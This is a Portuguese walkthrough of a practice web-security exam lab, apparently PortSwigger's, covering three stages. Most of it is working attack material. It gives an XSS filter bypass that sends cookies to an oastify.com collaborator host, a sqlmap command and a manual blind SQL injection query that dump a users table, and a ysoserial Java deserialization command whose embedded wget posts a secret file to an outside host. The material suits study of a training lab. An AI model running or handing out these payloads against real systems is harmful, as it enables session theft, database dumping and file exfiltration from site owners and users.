# Exame Prático 2

O segundo simulado é bem parecido com o primeiro, mudando apenas a dificuldade principalmente da primeira etapa.

<br>

## Etapa 1 - Acesso Inicial

O parâmetro de busca está vulnerável a XSS, assim como no exame prático 1. Porém, a maioria dos payloads são considerados perigosos e bloqueados.

Ao fazer alguns testes, você perceberá que o parênteses está sendo considerado como malicioso.

Para bypassar, podemos usar:
```
"-alert``}//

"-alert`${document.cookie}`}//
```

<br>

Para exfiltrar o cookie:
```
"-alert`${document.location='https://gi2vck1wpz14bg1t9xx9b52prgx7l19q.oastify.com?c='+document.cookie}`}//
```

Encodado em URL:
```
%22%2d%61%6c%65%72%74%60%24%7b%64%6f%63%75%6d%65%6e%74%2e%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%67%69%32%76%63%6b%31%77%70%7a%31%34%62%67%31%74%39%78%78%39%62%35%32%70%72%67%78%37%6c%31%39%71%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%3f%63%3d%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%7d%60%7d%2f%2f
```

<br>

Vi em algum Write-up que também poderiamos usar:
```
"};location=atob("base64('https://BURP-COLLAB-URL/?')")+document["cookie"]; //
```

<br>

## Etapa 2 - Escalação de Privilégios

Ao colocar uma aspa no parâmetro `order`, um error de SQL é retornado.

Podemos usar o SQLMap copiando a request utilizando a tab **Network** do navegador e clicando em `copy as cURL`.
```
sqlmap -u 'https://0aa0007b03f1a870832b554a00e20072.web-security-academy.net/filtered_search?find=Search&organize=5&order=ASC&BlogArtist=' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Connection: keep-alive' -H 'Referer: https://0aa0007b03f1a870832b554a00e20072.web-security-academy.net/filtered_search?find=Search&organize=5&order=ASC&BlogArtist=' -H 'Cookie: session=35F8LKiY7IBgeIAGXbUGDrUO4y8z5oEB; _lab=46%7cMCwCFCX410y74Ayq9D6pDa3x9Kusn%2f1vAhQrMssZ5xAmYYV574MeJcqdw3IFv6UzKaI4RJYcdV6H9H0eJ4T3JwbWof%2fnQrDmVH0Ut9T5jqT71Gm4MaUwhOcruMx2WqKd3SDqLwagQu33MbKooKat5LJik3kAJ89XqqircOG0lwNs1uk%3d' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: same-origin' -H 'Sec-Fetch-User: ?1' -H 'Priority: u=0, i' -H 'TE: trailers' \
--technique E --dbms postgresql --level 5 --batch --flush-session -p 'order' -D public -T users --dump
```

<br>

A exploração manual seria assim:
```
LIMIT (SELECT CASE WHEN (substr(password,INDEX,1)='CHARACTER') THEN 1/(SELECT 0) ELSE 1 END FROM users WHERE username='administrator')
```

## Etapa 3 - Exfiltração de Dados

Utilize a extensão Java Deserialization Scanner para identificar o cookie vulnerável e o seguinte comando para gerar o payload:
```
java -jar ysoserial-all.jar CommonsCollections4 'wget http://0jkfd42gqj2oc02dahytcp39s0yrmnac.oastify.com --post-file=/home/carlos/secret' | gzip -f | base64 -w 0
```

Lembre de encodar em URL!
